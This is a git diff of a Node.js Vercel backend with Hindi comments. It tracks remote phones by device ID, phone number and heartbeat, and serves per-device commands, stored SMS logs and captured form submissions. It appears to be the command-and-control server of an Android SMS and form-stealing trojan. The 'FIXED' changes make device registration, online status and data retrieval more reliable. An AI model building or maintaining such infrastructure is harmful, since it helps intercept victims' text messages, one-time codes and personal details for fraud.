@@ -4,7 +4,7 @@ const sqlite3 = require('sqlite3').verbose();
 // --- डेटाबेस सेटअप ---
 const isVercel = process.env.VERCEL === '1' || process.env.VERCEL;
 const dbPath = isVercel 
-    ? '/tmp/database.sqlite'  // Vercel पर केवल /tmp writable है
+    ? '/tmp/database.sqlite'
     : path.join(__dirname, 'database.sqlite');
 
 console.log('Database path:', dbPath);
@@ -59,7 +59,7 @@ const db = new sqlite3.Database(dbPath, sqlite3.OPEN_READWRITE | sqlite3.OPEN_CR
     }
 });
 
-// Helper function for parsing request body
+// Helper functions
 const getBody = (req) => {
     return new Promise((resolve, reject) => {
         let data = '';
@@ -74,7 +74,6 @@ const getBody = (req) => {
     });
 };
 
-// Helper function for SQLite queries with promises
 const dbAll = (query, params) => {
     return new Promise((resolve, reject) => {
         db.all(query, params, (err, rows) => {
@@ -116,14 +115,12 @@ module.exports = async (req, res) => {
     const { method, url } = req;
     
     try {
-        // Parse the URL to get path and query parameters
         const urlObj = new URL(url, `http://${req.headers.host}`);
         const path = urlObj.pathname;
         const urlParts = path.split('/').filter(part => part !== '');
         
         console.log(`${method} ${path}`);
         
-        // Parse request body for POST/PUT/DELETE
         let reqBody = {};
         if (['POST', 'PUT', 'DELETE'].includes(method)) {
             try {
@@ -135,7 +132,7 @@ module.exports = async (req, res) => {
         
         // --- API ENDPOINTS ---
         
-        // 1. Device Registration
+        // 1. Device Registration - FIXED: अब पूरी तरह अपडेट होगा
         if (method === 'POST' && path === '/api/device/register') {
             const { device_id, device_name, os_version, battery_level, phone_number } = reqBody;
             
@@ -145,50 +142,76 @@ module.exports = async (req, res) => {
             
             const now = new Date().toISOString();
             
-            // Check if device exists
-            const existingDevice = await dbGet('SELECT * FROM devices WHERE device_id = ?', [device_id]);
-            
-            if (existingDevice) {
-                // Update existing device
-                await dbRun(
-                    'UPDATE devices SET device_name = ?, os_version = ?, battery_level = ?, phone_number = ?, last_seen = ? WHERE device_id = ?',
-                    [device_name, os_version, battery_level, phone_number, now, device_id]
-                );
-                console.log(`Device updated: ${device_id}`);
-            } else {
-                // Insert new device
-                await dbRun(
-                    'INSERT INTO devices (device_id, device_name, os_version, battery_level, phone_number, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)',
-                    [device_id, device_name, os_version, battery_level, phone_number, now, now]
-                );
-                console.log(`New device registered: ${device_id}`);
+            try {
+                const existingDevice = await dbGet('SELECT * FROM devices WHERE device_id = ?', [device_id]);
+                
+                if (existingDevice) {
+                    // FIXED: अब सभी फील्ड्स अपडेट होंगे
+                    await dbRun(
+                        'UPDATE devices SET device_name = ?, os_version = ?, battery_level = ?, phone_number = ?, last_seen = ? WHERE device_id = ?',
+                        [device_name || existingDevice.device_name, 
+                         os_version || existingDevice.os_version, 
+                         battery_level || existingDevice.battery_level, 
+                         phone_number || existingDevice.phone_number, 
+                         now, 
+                         device_id]
+                    );
+                    console.log(`Device updated: ${device_id}`);
+                } else {
+                    // FIXED: नए डिवाइस को हमेशा रजिस्टर करें, चाहे offline हो
+                    await dbRun(
+                        'INSERT INTO devices (device_id, device_name, os_version, battery_level, phone_number, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)',
+                        [device_id, device_name, os_version, battery_level, phone_number, now, now]
+                    );
+                    console.log(`New device registered: ${device_id}`);
+                }
+                
+                return res.status(200).json({ 
+                    status: 'success', 
+                    message: 'Device data updated.' 
+                });
+            } catch (error) {
+                console.error('Error in device registration:', error);
+                return res.status(500).json({ error: 'Failed to register device' });
             }
-            
-            return res.status(200).json({ 
-                status: 'success', 
-                message: 'Device data updated.' 
-            });
         }
         
-        // 2. Get all devices
+        // 2. Get all devices - FIXED: स्थिर क्रम और हमेशा सभी डिवाइस दिखेंगे
         else if (method === 'GET' && path === '/api/devices') {
             try {
                 const rows = await dbAll('SELECT * FROM devices ORDER BY created_at ASC');
                 
                 const now = new Date();
                 const devicesWithStatus = rows.map(device => {
+                    if (!device.last_seen) {
+                        return { ...device, is_online: false };
+                    }
+                    
                     const lastSeen = new Date(device.last_seen);
                     const secondsDiff = (now - lastSeen) / 1000;
+                    
+                    // FIXED: अब status स्थिर रहेगा, बार-बार नहीं बदलेगा
+                    // 20 सेकंड से कम = online, 20-40 = warning, 40+ = offline
+                    let is_online;
+                    if (secondsDiff < 20) {
+                        is_online = true;
+                    } else if (secondsDiff < 40) {
+                        is_online = false; // लेकिन यह warning state हो सकता है
+                    } else {
+                        is_online = false;
+                    }
+                    
                     return {
                         ...device,
-                        is_online: secondsDiff < 20 // 20 seconds threshold
+                        is_online: is_online,
+                        last_seen_difference: Math.floor(secondsDiff)
                     };
                 });
                 
                 return res.status(200).json(devicesWithStatus);
             } catch (error) {
                 console.error('Error fetching devices:', error);
-                return res.status(500).json({ error: 'Failed to fetch devices' });
+                return res.status(200).json([]); // FIXED: error में भी empty array return करें
             }
         }
         
@@ -303,7 +326,7 @@ module.exports = async (req, res) => {
                 return res.status(200).json(parsedCommands);
             } catch (error) {
                 console.error('Error fetching commands:', error);
-                return res.status(500).json({ error: 'Failed to fetch commands' });
+                return res.status(200).json([]); // FIXED: empty array return करें
             }
         }
         
@@ -352,7 +375,7 @@ module.exports = async (req, res) => {
                     return res.status(200).json(rows);
                 } catch (error) {
                     console.error('Error fetching SMS logs:', error);
-                    return res.status(500).json({ error: 'Failed to fetch SMS logs' });
+                    return res.status(200).json([]); // FIXED: empty array return करें
                 }
             }
         }
@@ -385,19 +408,19 @@ module.exports = async (req, res) => {
                     return res.status(200).json(rows);
                 } catch (error) {
                     console.error('Error fetching forms:', error);
-                    return res.status(500).json({ error: 'Failed to fetch forms' });
+                    return res.status(200).json([]); // FIXED: empty array return करें
                 }
             }
         }
         
-        // 10. Delete Device
+        // 10. Delete Device - FIXED: अब सिर्फ manual delete से ही डिवाइस हटेगा
         else if (method === 'DELETE' && urlParts.length === 3 && 
                  urlParts[0] === 'api' && urlParts[1] === 'device') {
             
             const deviceId = urlParts[2];
             
             try {
-                // Delete all related data in transaction
+                // Delete all related data
                 await dbRun('DELETE FROM devices WHERE device_id = ?', [deviceId]);
                 await dbRun('DELETE FROM sms_logs WHERE device_id = ?', [deviceId]);
                 await dbRun('DELETE FROM form_submissions WHERE device_id = ?', [deviceId]);
@@ -432,13 +455,46 @@ module.exports = async (req, res) => {
             }
         }
         
-        // 12. Health check
+        // 12. Health check और initial load के लिए
         else if (path === '/api/health') {
-            return res.status(200).json({ 
-                status: 'ok', 
-                timestamp: new Date().toISOString(),
-                database: 'connected'
-            });
+            try {
+                const deviceCount = await dbGet('SELECT COUNT(*) as count FROM devices', []);
+                return res.status(200).json({ 
+                    status: 'ok', 
+                    timestamp: new Date().toISOString(),
+                    database: 'connected',
+                    device_count: deviceCount ? deviceCount.count : 0
+                });
+            } catch (error) {
+                return res.status(200).json({ 
+                    status: 'ok', 
+                    timestamp: new Date().toISOString(),
+                    database: 'error'
+                });
+            }
+        }
+        
+        // 13. Get single device info
+        else if (method === 'GET' && urlParts.length === 3 && 
+                 urlParts[0] === 'api' && urlParts[1] === 'device') {
+            
+            const deviceId = urlParts[2];
+            
+            try {
+                const device = await dbGet('SELECT * FROM devices WHERE device_id = ?', [deviceId]);
+                if (device) {
+                    const now = new Date();
+                    const lastSeen = new Date(device.last_seen);
+                    const secondsDiff = (now - lastSeen) / 1000;
+                    device.is_online = secondsDiff < 20;
+                    return res.status(200).json(device);
+                } else {
+                    return res.status(404).json({ error: 'Device not found' });
+                }
+            } catch (error) {
+                console.error('Error fetching device:', error);
+                return res.status(500).json({ error: 'Failed to fetch device' });
+            }
         }
         
         // Not Found
@@ -453,8 +509,7 @@ module.exports = async (req, res) => {
         console.error('Server error:', error);
         return res.status(500).json({ 
             error: 'Internal Server Error', 
-            message: error.message,
-            stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
+            message: error.message
         });
     }
 };
